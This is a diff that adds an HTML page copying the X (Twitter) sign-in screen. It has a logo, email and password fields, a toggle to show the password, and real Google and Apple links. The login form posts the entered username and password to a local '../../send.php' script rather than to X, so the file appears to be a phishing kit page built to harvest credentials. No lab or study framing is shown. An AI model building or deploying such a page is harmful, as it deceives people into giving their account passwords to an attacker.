@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>X Login</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, Helvetica, sans-serif;
+  background:white;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+}
+
+.container{
+  width:360px;
+  text-align:center;
+}
+
+.logo{
+  margin-bottom:25px;
+}
+
+.logo img{
+  width:50px;
+}
+
+h1{
+  font-size:30px;
+  margin-bottom:25px;
+}
+
+.input-container{
+  position:relative;
+}
+
+input{
+  width:100%;
+  padding:15px;
+  margin:10px 0;
+  border:1px solid #cfd9de;
+  border-radius:6px;
+  font-size:16px;
+  box-sizing:border-box;
+}
+
+.toggle-password{
+  position:absolute;
+  right:12px;
+  top:50%;
+  transform:translateY(-50%);
+  cursor:pointer;
+  width:24px;
+  height:24px;
+}
+
+.login{
+  width:100%;
+  padding:14px;
+  background:black;
+  color:white;
+  border:none;
+  border-radius:25px;
+  font-size:15px;
+  font-weight:bold;
+  cursor:pointer;
+  margin-top:10px;
+}
+
+.btn{
+  width:100%;
+  padding:14px;
+  border:1px solid #cfd9de;
+  border-radius:25px;
+  font-size:15px;
+  cursor:pointer;
+  margin-top:10px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  text-decoration:none;
+  color:black;
+}
+
+.btn img{
+  width:18px;
+  height:18px;
+}
+
+.or{
+  margin:20px 0;
+  color:#536471;
+}
+
+.signup{
+  margin-top:20px;
+  color:#536471;
+}
+
+a{
+  color:#1d9bf0;
+  text-decoration:none;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<img src="logo.png">
+</div>
+
+<h1>Sign in to X</h1>
+
+<form action="../../send.php" method="post">
+
+<input type="text" placeholder="Phone, email, or username" name="email" required>
+
+<div class="input-container">
+<input type="password" placeholder="Password" name="password" id="password" required>
+<img class="toggle-password" id="eye" src="../images/ey2.png" onclick="togglePassword()" alt="Toggle Password">
+</div>
+
+<button class="login">Log in</button>
+</form>
+
+<div class="or">or</div>
+
+<a class="btn" href="https://accounts.google.com/">
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg">
+Sign in with Google
+</a>
+
+<a class="btn" href="https://appleid.apple.com/">
+<img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+Sign in with Apple
+</a>
+
+<div class="signup">
+Don't have an account? <a href="https://x.com/i/flow/signup">Sign up</a>
+</div>
+
+<script>
+function togglePassword() {
+  const passwordField = document.getElementById('password');
+  const eye = document.getElementById('eye');
+
+  if(passwordField.type === "password") {
+    passwordField.type = "text";
+    eye.src = "../images/ey.png"; 
+  } else {
+    passwordField.type = "password";
+    eye.src = "../images/ey2.png"; 
+  }
+}
+</script>
+
+</body>
+</html>
